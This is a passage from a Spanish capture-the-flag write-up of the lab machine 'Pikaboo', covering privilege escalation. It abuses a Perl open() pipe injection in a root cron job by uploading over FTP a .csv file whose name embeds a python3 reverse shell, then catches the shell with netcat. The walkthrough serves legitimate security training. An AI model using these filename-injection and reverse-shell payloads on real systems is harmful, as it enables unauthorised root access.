Vemos que el usuario `root` está ejecutando el archivo `csvupdate_cron`:

Bien, veamos que contiene este fichero:

```bash
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```
Ok, parece ser simplemente un _bucle for_.

Este se ve que itera sobre los directorios alojados en la ruta `/srv/ftp/` y por cada directorio:
  
  1. Accede a él con el comando `cd`
  2. Ejecuta otro script con nombre `csvupdate` pasandole el nombre del directorio y `*csv` que hace referencia a `todo lo que acabe en csv`
  3. Por último, borra todo lo que haya en ese directorio.

Vale, hay que ver varias cosas aquí, primero veamos que hay en la ruta `/srv/ftp/`:

```bash
www-data@pikaboo:/$ ls -la /srv/ftp/
total 712

[...]

drwx-wx---   2 root ftp   4096 May 20  2021 pokemon_types
drwx-wx---   2 root ftp   4096 May 20  2021 pokemon_types_past
drwx-wx---   2 root ftp   4096 May 20  2021 region_names
drwx-wx---   2 root ftp   4096 May 20  2021 regions
drwx-wx---   2 root ftp   4096 May 20  2021 stat_names
drwx-wx---   2 root ftp   4096 Dec 14 21:12 stats
drwx-wx---   2 root ftp   4096 May 20  2021 super_contest_combos
drwx-wx---   2 root ftp   4096 May 20  2021 super_contest_effect_prose
drwx-wx---   2 root ftp   4096 May 20  2021 super_contest_effects
drwx-wx---   2 root ftp   4096 May 20  2021 type_efficacy
drwx-wx---   2 root ftp   4096 May 20  2021 type_game_indices
drwx-wx---   2 root ftp   4096 May 20  2021 type_names
drwx-wx---   2 root ftp   4096 May 20  2021 types
drwx-wx---   2 root ftp   4096 May 20  2021 version_group_pokemon_move_methods
drwx-wx---   2 root ftp   4096 May 20  2021 version_group_regions
drwx-wx---   2 root ftp   4096 May 20  2021 version_groups
drwx-wx---   2 root ftp   4096 May 20  2021 version_names
drwx-wx---   2 root ftp   4096 Dec 14 21:10 versions
```
Parece ser que estamos viendo lo que veíamos desde el servidor **FTP**, muchos directorios en los cuales no tenemos ningun permiso como el actual usuario (desde el FTP teniamos permisos de _writable y _executable_), curioso.

Otra cosa a mirar era el script del cual se hacía uso en el bucle, el cual se aloja en `/usr/local/bin/csvupdate`:

```perl
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  
  [...]
  
  'pokemon_types' => 3,
  'pokemon_types_past' => 4,
  'region_names' => 3,
  'regions' => 2,
  'stat_names' => 3,
  'stats' => 5,
  'super_contest_combos' => 2,
  'super_contest_effect_prose' => 3,
  'super_contest_effects' => 2,
  'type_efficacy' => 3,
  'type_game_indices' => 3,
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```
No sé nada de perl, pero más o menos consigo entender el código:

Primeramente, vemos arriba la descripción del programa:

> Script for upgrading PokeAPI CSV files with FTP-uploaded data

Y también que se usa pasando le un tipo de archivo y el archivo en sí.

Podemos ver el _core_ del código aquí:

```perl
my $csv = Text::CSV->new({ sep_char => ',' });
my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";
```
Parece que toma el nombre del archivo, comprueba que termina en .csv y luego utiliza la función `open` en él.

Al no entender como funcionaba la función `open` de perl, la fui a buscar por Internet con Google y el _autocomplete_ me reveló algo:

![image](https://user-images.githubusercontent.com/67548295/146094085-7a8bd4ad-1557-4298-8342-2daf639a7d91.png)

¿Cómo? ¿RCE en una función? Investigué más en detalle y encontré esto: 

   * [perl open\(\) injection prevention - Stack Overflow](https://stackoverflow.com/questions/26614348/perl-open-injection-prevention){:target="\_blank"}{:rel="noopener nofollow"}

Básicamente la vulnerabilidad reside en que se puede lograr una **ejecución remota de comandos** creando un archivo con el nombre del comando a ejecutar con un _pipe_ delante.

De esta forma:

> `|whoami`

En nuestro caso habría que añadirle la extensión `.csv` ya que se valida.

En resumen, podríamos lograr escalar privilegios creando un archivo con un _pipe_ y una **reverse shell** como nombre, subiendolo a cualquier directorio del FTP para que el script lo ejecute y ganar acceso como `root`.

Hagamos esto paso a paso:

##### Paso 1 - Crear el archivo malicioso

En mi caso pondré una reverse shell en **python3**:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ touch "|python3 -c 'a=__import__;s=a("\"socket\"");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.10.14.145\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"sh\")'".csv
```

##### Paso 2 - Nos ponemos en escucha por el puerto especificado

En mi caso, por el puerto `4242`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvp 4242
Listening on 0.0.0.0 4242
```

| Parámetro | Acción |
|:---------:|:------:|
| `-l` | Habilita el modo escucha, para conexiones entrantes |
| `-v` | Este parámetro dice que queremos que nos reporte más información de lo normal |
| `-p` | Especificamos el puerto por el cual nos queremos poner en escucha, en mi caso el `4242` |


##### Paso 3 - Subimos el archivo al servidor FTP

Se puede subir a cualquier directorio, yo lo voy a hacer en `versions/`

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:z3r0byte): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd versions/
250 Directory successfully changed.
ftp> put "|python3 -c 'a=__import__;s=a("\"socket\");o=a(""\"os\").dup2;p=a(""\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((""\"10.10.14.145\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(""\"sh\")'.csv"
local: |python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.10.14.145",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("sh")'.csv remote: |python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.10.14.145",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("sh")'.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
```
En este momento, nos llegaría una shell de nuestra propia máquina, solamente hay que hacer `ctrl + c` para parar el proceso y volverse a poner en escucha de nuevo.

> Habría que subirlo así, por poblemas de comillas y demás: 
`put "\python3 -c 'a=__import__;s=a("\"socket\");o=a(""\"os\").dup2;p=a(""\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((""\"10.10.14.145\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(""\"sh\")'.csv"`

##### Paso 4 - Esperar por la shell

Si lo hemos hecho bien, en cuestión de un minuto deberíamos de recibir una shell como usuario `root` en la máquina víctima.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvp 4242
Listening on 0.0.0.0 4242
Connection received on 10.10.10.249 49434
# whoami; id; hostname
whoami; id; hostname
root
uid=0(root) gid=0(root) groups=0(root)
pikaboo.htb
```
---

Una vez en este punto podremos visualizar la flag root.txt en `/root/root.txt` y la flag user.txt localizada en `/home/pwnmeow/user.txt`:

```bash
root@pikaboo:/# echo -e "\n[+] root.txt: `cat /root/root.txt`\n[+] user.txt: `cat /home/pwnmeow/user.txt`"

[+] root.txt: 9XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
[+] user.txt: fXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0
```

# Conclusión

En esta máquina hemos explotado varias cosas ganar acceso, en primer lugar, nos hemos aprovechado de un _misconfiguration_ de `Nginx` para poder acceder a un panel al que no teníamos acceso. Este panel era vulnerable a `LFI` y conseguimos acceso a la máquina como usuario no privilegiado mediante un `Log Poisoning`.

Para escalar privilegios, abusamos de la función `open()` de perl para conseguir una **ejecución remota de comandos** y convertirnos en superusuario mediante una **reverse shell**.









